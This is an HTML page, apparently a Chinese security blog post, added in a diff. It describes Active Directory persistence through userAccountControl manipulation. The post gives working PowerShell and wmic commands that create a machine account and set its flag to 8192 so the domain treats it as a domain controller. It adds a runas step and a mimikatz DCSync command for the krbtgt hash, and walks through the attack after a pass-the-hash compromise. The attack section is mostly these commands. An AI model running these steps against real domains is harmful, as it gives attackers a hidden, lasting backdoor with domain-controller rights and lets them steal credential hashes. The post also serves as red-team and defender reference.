@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>userAccountControl权限维持 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">userAccountControl权限维持</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-01-14 16:50:48">2022-01-14 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-漏洞详情">一、漏洞详情</h1>
+<p> ·1、<a href="https://twitter.com/kaidja/status/1480212323818217479">Create a fake computer account and change the UserAccountControl value to 8192. Now the AD thinks it is a domain controller.</a><br>
+ ·2、<a href="https://stealthbits.com/blog/server-untrust-account/">Active Directory persistence through userAccountControl manipulation</a><br>
+ ·3、<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a><br>
+ 概要：该漏洞主要用于权限维持，当攻击者拿下域控后，可以创建一个机器账户，并通过特殊手段，将该账户提权至域控，此时机器账户可以作为后门使用。</p>
+<h1 id="二-漏洞用法">二、漏洞用法</h1>
+<pre><code>#创建机器账户
+New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Heo!&quot; -Force -AsPlainText)
+
+#修改userAccountControl
+Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}
+
+#验证是否被识别为域控
+Get-ADGroupMember -Identity &quot;Domain Controllers&quot; 
+或
+net group &quot;domain controllers&quot; /domain
+
+#以机器账户打开cmd
+runas /user:&lt;domian&gt;\SecTest2$ /netonly cmd
+
+#Run the Dcsync command 
+lsadump::dcsync /user:krbtgt
+</code></pre>
+<h1 id="三-漏洞复现过程">三、漏洞复现过程</h1>
+<p> 1、攻击前仅有一个域控<br>
+<code>net group &quot;domain controllers&quot; /domain</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847423381.png" alt="" loading="lazy"><br>
+ 2、此时，假设我们通过hash传递获取了一个拥有域管权限的shell<br>
+<img src="https://V-alkoinen.github.io/post-images/1642847518854.png" alt="" loading="lazy"><br>
+ 执行下面命令</p>
+<pre><code>#创建机器账户
+wmic /node:'ad-m' process call create &quot;cmd /c powershell New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Hello1234!&quot; -Force AsPlainText)&quot;
+
+#修改userAccountControl
+wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}&quot;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642847721345.png" alt="" loading="lazy"><br>
+ 3、查看域控，发现已有两个域管<br>
+<code>net group &quot;domain controllers&quot; /domain</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847761163.png" alt="" loading="lazy"><br>
+ 4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
+<code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/">CVE-2021-4034 Polkit local privilege escalation</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/">MyBatis框架SQL Injection解决方案</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
